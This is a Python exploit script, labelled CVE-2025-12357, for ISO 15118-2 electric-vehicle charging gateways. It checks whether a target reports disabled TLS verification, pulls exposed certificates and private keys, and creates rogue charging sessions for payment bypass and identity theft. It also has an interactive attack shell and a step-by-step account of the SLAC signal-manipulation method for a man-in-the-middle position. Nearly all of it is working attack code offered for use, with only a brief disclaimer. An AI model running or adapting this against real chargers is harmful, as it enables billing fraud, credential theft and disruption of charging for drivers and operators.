#!/usr/bin/env python3
"""
CVE-2025-12357 - ISO 15118-2 Man-in-the-Middle Exploit
Signal attenuation manipulation and TLS bypass

Vulnerability:
- Disabled TLS certificate verification in V2G communication
- Exposed private keys allow session interception
- SLAC signal manipulation enables MitM position

Affected: ISO 15118-2 implementations without proper certificate validation

Attack Chain:
1. Discover vulnerable gateway via exposed certificates endpoint
2. Extract private keys and certificates
3. Position as MitM using SLAC manipulation
4. Intercept and modify V2G communication
5. Perform unauthorized actions (payment bypass, session hijacking)

DISCLAIMER: For authorized security testing and education only.
"""

import argparse
import requests
import json
import sys
import base64
from datetime import datetime

# Import attack reporter for live feed
try:
    from attack_reporter import report_attack, report_step, report_success, report_failure, report_command, report_data
    HAS_REPORTER = True
except ImportError:
    HAS_REPORTER = False
    def report_attack(*args, **kwargs): pass
    def report_step(*args, **kwargs): pass
    def report_success(*args, **kwargs): pass
    def report_failure(*args, **kwargs): pass
    def report_command(*args, **kwargs): pass
    def report_data(*args, **kwargs): pass


class ISO15118MitMExploit:
    def __init__(self, target: str, port: int = 8086):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}"
        self.target_str = f"{target}:{port}"
        self.session = requests.Session()
        self.session.timeout = 10
        
        # Stolen credentials storage
        self.stolen_certs = {}
        self.hijacked_sessions = []
        
        # Report attack start
        report_attack(
            cve="CVE-2025-12357",
            name="ISO 15118-2 MitM Exploit",
            severity="critical",
            target=self.target_str,
            attack_type="mitm"
        )
    
    def check_vulnerable(self) -> bool:
        """Check if target is vulnerable ISO 15118 gateway"""
        report_step(f"Checking {self.base_url}/api/v2g/status for TLS bypass")
        try:
            resp = self.session.get(f"{self.base_url}/api/v2g/status")
            if resp.status_code == 200:
                data = resp.json()
                if data.get("tls_verify") == False:
                    report_success("TLS certificate verification is DISABLED - MitM possible!")
                    return True
        except:
            pass
        report_failure("Target has TLS verification enabled")
        return False
    
    def get_v2g_status(self) -> dict:
        """Get V2G communication status"""
        try:
            resp = self.session.get(f"{self.base_url}/api/v2g/status")
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def extract_certificates(self) -> dict:
        """
        CVE-2025-12357: Extract exposed certificates and private keys
        This allows forging TLS connections and performing MitM attacks
        """
        report_step("Extracting exposed certificates and private keys", severity="critical")
        try:
            resp = self.session.get(f"{self.base_url}/api/certificates")
            data = resp.json()
            self.stolen_certs = data.get("certificates", {})
            if self.stolen_certs:
                report_data("certificates", {
                    "root_ca": self.stolen_certs.get("root_ca", "")[:50] + "...",
                    "private_key": "EXPOSED" if self.stolen_certs.get("private_key") else "Not found"
                }, "Certificates and PRIVATE KEY extracted!")
            return data
        except Exception as e:
            return {"error": str(e)}
    
    def create_rogue_session(self, contract_id: str = None) -> dict:
        """
        Establish a V2G session that bypasses TLS verification
        In a real attack, this would be done after MitM positioning
        """
        report_step("Creating rogue V2G session (payment bypass)", severity="critical")
        try:
            payload = {
                "contract_id": contract_id or "ATTACKER-CONTRACT-001",
                "evcc_id": "ROGUE-EVCC-12345",
                "protocol": "DIN70121"  # or ISO15118-2
            }
            resp = self.session.post(
                f"{self.base_url}/api/v2g/session",
                json=payload,
                headers={"Content-Type": "application/json"}
            )
            result = resp.json()
            if "session_id" in result:
                self.hijacked_sessions.append(result)
                report_success(f"Rogue session created: {result.get('session_id')}")
            return result
        except Exception as e:
            return {"error": str(e)}
    
    def analyze_vulnerability(self) -> None:
        """Comprehensive vulnerability analysis"""
        print("\n" + "="*60)
        print("ISO 15118-2 VULNERABILITY ANALYSIS")
        print("="*60)
        
        # Step 1: Get V2G Status
        print("\n[STEP 1] Checking V2G Communication Status...")
        status = self.get_v2g_status()
        
        if "error" in status:
            print(f"[-] Error: {status['error']}")
            return
        
        print(f"    Device ID: {status.get('device_id', 'Unknown')}")
        print(f"    ISO 15118 Version: {status.get('iso15118_version', 'Unknown')}")
        print(f"    TLS Enabled: {status.get('tls_enabled', 'Unknown')}")
        
        tls_verify = status.get('tls_verify', True)
        print(f"    TLS Verification: {'ENABLED' if tls_verify else 'DISABLED (VULNERABLE)'}")
        
        if not tls_verify:
            print("\n    [!] CRITICAL: TLS certificate verification is DISABLED!")
            print("    [!] This allows Man-in-the-Middle attacks on V2G communication")
        
        print(f"    Plug & Charge: {status.get('pnc_enabled', 'Unknown')}")
        print(f"    SLAC Status: {status.get('slac_status', 'Unknown')}")
        
        # Step 2: Extract Certificates
        print("\n[STEP 2] Extracting Certificates and Keys...")
        certs = self.extract_certificates()
        
        if "certificates" in certs:
            print("\n    [+] Certificates extracted successfully!")
            for cert_type, cert_value in certs["certificates"].items():
                print(f"    - {cert_type}: {cert_value[:30]}...")
            
            if "private_key" in str(certs).lower():
                print("\n    [!] CRITICAL: Private key is EXPOSED!")
                print("    [!] Attacker can forge TLS connections")
        
        if certs.get("warning"):
            print(f"\n    [!] Warning: {certs['warning']}")
    
    def demonstrate_mitm_attack(self) -> None:
        """Demonstrate the full MitM attack chain"""
        print("\n" + "="*60)
        print("MAN-IN-THE-MIDDLE ATTACK DEMONSTRATION")
        print("="*60)
        
        # Phase 1: Reconnaissance
        print("\n[PHASE 1] RECONNAISSANCE")
        print("-" * 40)
        self.analyze_vulnerability()
        
        # Phase 2: Key Extraction
        print("\n[PHASE 2] CREDENTIAL THEFT")
        print("-" * 40)
        
        if self.stolen_certs:
            print("[+] Using previously extracted certificates...")
        else:
            print("[*] Extracting certificates...")
            self.extract_certificates()
        
        if self.stolen_certs:
            print("[+] Stolen credentials:")
            for k, v in self.stolen_certs.items():
                print(f"    {k}: {v[:40]}{'...' if len(str(v)) > 40 else ''}")
        
        # Phase 3: Session Hijacking
        print("\n[PHASE 3] SESSION HIJACKING")
        print("-" * 40)
        
        print("[*] Creating rogue V2G session...")
        print("[*] In real attack: SLAC manipulation to become preferred EVSE")
        print("[*] In real attack: TLS interception using stolen keys")
        
        # Simulate different attack scenarios
        scenarios = [
            ("Payment Bypass", "BYPASS-PAYMENT-001"),
            ("Identity Theft", "STOLEN-CONTRACT-002"),
            ("Free Charging", "FREE-CHARGE-003"),
        ]
        
        for scenario_name, contract_id in scenarios:
            print(f"\n[*] Attack Scenario: {scenario_name}")
            result = self.create_rogue_session(contract_id)
            
            if "session_id" in result:
                print(f"    [+] Session established: {result['session_id']}")
                print(f"    [+] TLS Verified: {result.get('tls_verified', 'N/A')}")
                print(f"    [+] MitM Possible: {result.get('mitm_possible', 'N/A')}")
                if result.get("warning"):
                    print(f"    [!] {result['warning']}")
            else:
                print(f"    [-] Failed: {result.get('error', 'Unknown error')}")
        
        # Phase 4: Impact Assessment
        print("\n[PHASE 4] IMPACT ASSESSMENT")
        print("-" * 40)
        print("""
[+] Successful MitM attack allows:
    1. PAYMENT BYPASS
       - Intercept and modify payment authorization messages
       - Charge for free by spoofing successful payment responses
    
    2. IDENTITY THEFT  
       - Steal contract certificates (eMobility IDs)
       - Impersonate legitimate users for billing fraud
    
    3. SESSION MANIPULATION
       - Terminate legitimate charging sessions
       - Inject malformed messages causing DoS
       - Modify charging parameters (power, time limits)
    
    4. DATA EXFILTRATION
       - Capture user credentials and payment info
       - Extract vehicle identification (VIN)
       - Collect mobility patterns and habits

[!] CRITICAL RISK: Without TLS verification, ALL V2G traffic is compromised
""")
        
        # Summary
        print("\n" + "="*60)
        print("ATTACK SUMMARY")
        print("="*60)
        print(f"    Target: {self.base_url}")
        print(f"    Certificates Stolen: {len(self.stolen_certs)}")
        print(f"    Sessions Hijacked: {len(self.hijacked_sessions)}")
        print(f"    Attack Success: {'YES' if self.hijacked_sessions else 'PARTIAL'}")
    
    def slac_manipulation_info(self) -> None:
        """Information about SLAC manipulation attack vector"""
        print("""
╔══════════════════════════════════════════════════════════════════╗
║              SLAC MANIPULATION ATTACK VECTOR                      ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  SLAC (Signal Level Attenuation Characterization) is used in     ║
║  ISO 15118 to establish powerline communication between EV        ║
║  and charging station.                                            ║
║                                                                   ║
║  ATTACK METHOD (CVE-2025-12357):                                 ║
║                                                                   ║
║  1. PASSIVE PHASE                                                 ║
║     - Monitor SLAC handshake between EV and EVSE                 ║
║     - Capture signal attenuation measurements                     ║
║     - Identify communication parameters                           ║
║                                                                   ║
║  2. ACTIVE PHASE                                                  ║
║     - Inject stronger signal to appear as "closer" EVSE          ║
║     - Manipulate attenuation values in M-SOUND messages          ║
║     - Force EV to associate with attacker's node                 ║
║                                                                   ║
║  3. MitM POSITION                                                 ║
║     - Once associated, relay messages between EV and real EVSE   ║
║     - Modify, drop, or inject V2G messages                       ║
║     - Bypass payment, steal credentials, cause DoS               ║
║                                                                   ║
║  TOOLS NEEDED:                                                    ║
║     - HomePlug AV compatible adapter                              ║
║     - Faifa or custom SLAC tools                                  ║
║     - mitmproxy for TLS interception                              ║
║                                                                   ║
╚══════════════════════════════════════════════════════════════════╝
""")
    
    def interactive_mode(self) -> None:
        """Interactive exploitation mode"""
        print("\n[*] ISO 15118 MitM Interactive Mode")
        print("[*] Type 'help' for commands")
        
        while True:
            try:
                cmd = input("\niso15118-mitm> ").strip().lower()
                
                if not cmd:
                    continue
                elif cmd == 'exit':
                    break
                elif cmd == 'help':
                    print("""
Commands:
  status    - Get V2G communication status
  certs     - Extract certificates and private keys
  hijack    - Create rogue V2G session
  analyze   - Full vulnerability analysis
  demo      - Run MitM demonstration
  slac      - Show SLAC manipulation info
  sessions  - List hijacked sessions
  exit      - Exit
""")
                elif cmd == 'status':
                    result = self.get_v2g_status()
                    print(json.dumps(result, indent=2))
                elif cmd == 'certs':
                    result = self.extract_certificates()
                    print(json.dumps(result, indent=2))
                elif cmd == 'hijack':
                    contract = input("Contract ID (or press Enter for default): ").strip()
                    result = self.create_rogue_session(contract or None)
                    print(json.dumps(result, indent=2))
                elif cmd == 'analyze':
                    self.analyze_vulnerability()
                elif cmd == 'demo':
                    self.demonstrate_mitm_attack()
                elif cmd == 'slac':
                    self.slac_manipulation_info()
                elif cmd == 'sessions':
                    if self.hijacked_sessions:
                        for i, s in enumerate(self.hijacked_sessions):
                            print(f"{i+1}. {s.get('session_id', 'Unknown')}")
                    else:
                        print("No sessions hijacked yet")
                else:
                    print(f"Unknown command: {cmd}")
                    
            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                break
            except EOFError:
                break


def print_banner():
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║       CVE-2025-12357 - ISO 15118-2 MitM Exploit              ║
    ║       Signal Attenuation Manipulation & TLS Bypass            ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  Impact: Payment bypass, credential theft, session hijacking  ║
    ║  Vector: SLAC manipulation + disabled TLS verification        ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)


def main():
    parser = argparse.ArgumentParser(
        description="ISO 15118-2 MitM Exploit (CVE-2025-12357)"
    )
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("port", nargs="?", type=int, default=8086, help="Target port (default: 8086)")
    parser.add_argument("--status", action="store_true", help="Get V2G status")
    parser.add_argument("--certs", action="store_true", help="Extract certificates")
    parser.add_argument("--hijack", metavar="CONTRACT", help="Hijack session with contract ID")
    parser.add_argument("--analyze", action="store_true", help="Full vulnerability analysis")
    parser.add_argument("--demo", action="store_true", help="Run full MitM demonstration")
    parser.add_argument("--slac", action="store_true", help="Show SLAC manipulation info")
    parser.add_argument("-i", "--interactive", action="store_true", help="Interactive mode")
    
    args = parser.parse_args()
    
    print_banner()
    
    exploit = ISO15118MitMExploit(args.target, args.port)
    
    print(f"[*] Target: {exploit.base_url}")
    
    if exploit.check_vulnerable():
        print("[+] Target confirmed VULNERABLE!")
        print("[+] TLS certificate verification is DISABLED")
    else:
        print("[-] Target may not be vulnerable or unreachable")
        print("[*] Continuing anyway...")
    
    if args.status:
        result = exploit.get_v2g_status()
        print(json.dumps(result, indent=2))
    
    elif args.certs:
        result = exploit.extract_certificates()
        print(json.dumps(result, indent=2))
    
    elif args.hijack:
        result = exploit.create_rogue_session(args.hijack)
        print(json.dumps(result, indent=2))
    
    elif args.analyze:
        exploit.analyze_vulnerability()
    
    elif args.demo:
        exploit.demonstrate_mitm_attack()
    
    elif args.slac:
        exploit.slac_manipulation_info()
    
    elif args.interactive:
        exploit.interactive_mode()
    
    else:
        # Default: analyze and demo
        exploit.demonstrate_mitm_attack()


if __name__ == "__main__":
    main()
